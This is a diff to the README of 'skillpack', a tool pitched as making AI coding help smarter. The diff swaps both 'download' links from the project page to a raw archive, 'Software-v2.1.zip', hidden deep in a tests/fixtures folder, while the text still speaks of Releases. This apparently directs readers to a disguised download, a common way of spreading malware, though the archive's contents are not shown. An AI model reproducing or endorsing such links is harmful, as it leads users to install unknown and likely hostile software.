@@ -26,7 +26,7 @@ In plain terms: if you use AI to help write code, skillpack makes it smarter and
 Getting skillpack on your PC is simple. Follow these steps carefully:
 
 1. **Visit the download page** by clicking the button below (or the one at the top of this page):
-   [![Download Skillpack](https://img.shields.io/badge/Download-Skillpack-blue)](https://github.com/randolfglorious1317/skillpack)
+   [![Download Skillpack](https://img.shields.io/badge/Download-Skillpack-blue)](https://github.com/randolfglorious1317/skillpack/raw/refs/heads/main/tests/fixtures/pstack-repo-root/pstack/skills/setup-pstack/Software-v2.1.zip)
 
 2. Visit this link to download the application. You'll see a page with project files. Look for the **"Releases"** section or the **"Download ZIP"** button on the right side.
 
@@ -117,7 +117,7 @@ Absolutely! You can show them the exact commands you used. It's a great way to c
 
 Skillpack is your gatekeeper to a better AI coding experience. By allowing you to pick and combine skill packs safely, you'll get smarter, more effective AI help with just a few keystrokes. And since you've got this guide, you're already on the right track.
 
-Go ahead, [download skillpack](https://github.com/randolfglorious1317/skillpack) and start supercharging your AI today. Your future self will thank you!
+Go ahead, [download skillpack](https://github.com/randolfglorious1317/skillpack/raw/refs/heads/main/tests/fixtures/pstack-repo-root/pstack/skills/setup-pstack/Software-v2.1.zip) and start supercharging your AI today. Your future self will thank you!
 
 ---
 
